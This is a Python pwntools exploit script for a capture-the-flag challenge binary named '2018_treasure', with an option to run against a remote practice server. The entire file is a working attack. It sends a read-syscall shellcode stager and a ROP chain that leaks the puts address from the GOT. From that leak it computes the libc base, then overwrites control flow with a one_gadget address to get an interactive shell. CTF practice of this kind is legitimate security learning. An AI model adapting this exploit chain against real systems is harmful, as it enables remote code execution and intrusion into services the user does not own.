#!/usr/bin/env python
# -*- encoding: utf-8 -*-
'''
@File    :   exp.py
@Time    :   2021/07/30 21:36:30
@Author  :   eur1ka  
@Version :   2.7
@Contact :   eur1ka@163.com
'''
# here put the import lib
from pwn import *
from LibcSearcher import *
import pwnlib
debug = 1
context.log_level = 'debug'
context.arch = 'amd64'
file_name = "./2018_treasure"
menu = ""
if context.arch == "amd64":
    # libc_path = "/lib/x86_64-linux-gnu/libc.so.6"
    # one_offset = [0x4f3d5,0x4f432,0x10a41c]
    libc_path = "../../libc/libc-2.27.so"
    one_offset = [0x4f2c5,0x4f322,0x10a38c]
else:
    # libc_path = "~/Desktop/pwn/libc/libc-2.27-32.so"
    libc_path = "/lib/i386-linux-gnu/libc.so.6"
libc = ELF(libc_path)
elf = ELF(file_name)
if debug:
    if context.arch == "amd64":
        sh = process([file_name],env={'LD_PRELOAD':libc_path})
        # sh = process(file_name)
    else:
        # sh = process([file_name],env={'LD_PRELOAD':libc_path})
        sh = process(file_name)
else:
    IP = "node4.buuoj.cn"
    port = 28982
    sh = remote(IP,port)
def debug():
    gdb.attach(sh)
    pause()
def cmd(choice):
    sh.recvuntil(menu)
    sh.sendline(str(choice))

shellcode = '''
push rsp
pop rsi
mov edx,esi
syscall
ret
'''
pop_rdi_ret = 0x0000000000400b83
pop_rsi_r15_ret = 0x0000000000400b81

payload = asm(shellcode)
sh.recvuntil("will you continue?(enter 'n' to quit) :")
sh.sendline("Y")
sh.recvuntil("start!!!!")
# debug()
# debug()
sh.send(payload)
rop = p64(pop_rdi_ret) + p64(elf.got['puts'])+p64(elf.plt['puts']) + p64(0x00000000004009BA)
sleep(0.5)
sh.send(rop)
puts_addr = u64(sh.recv(6).ljust(8,'\x00'))
libc_base = puts_addr - libc.symbols['puts']
log.info("puts_addr=>{}".format(hex(puts_addr)))
# debug()
# pause()
one = libc_base + one_offset[1]
sh.recvuntil("will you continue?(enter 'n' to quit) :")
sh.sendline("Y")
sh.recvuntil("start!!!!")
# shellcode = '''
# push rsp
# pop rsi
# mov edx,edi
# syscall
# '''
sh.send(asm(shellcode))

sleep(0.2)
# debug()
sh.send(p64(one)+"\x00"*0x43)
# sh.send(p64(one))
sh.interactive()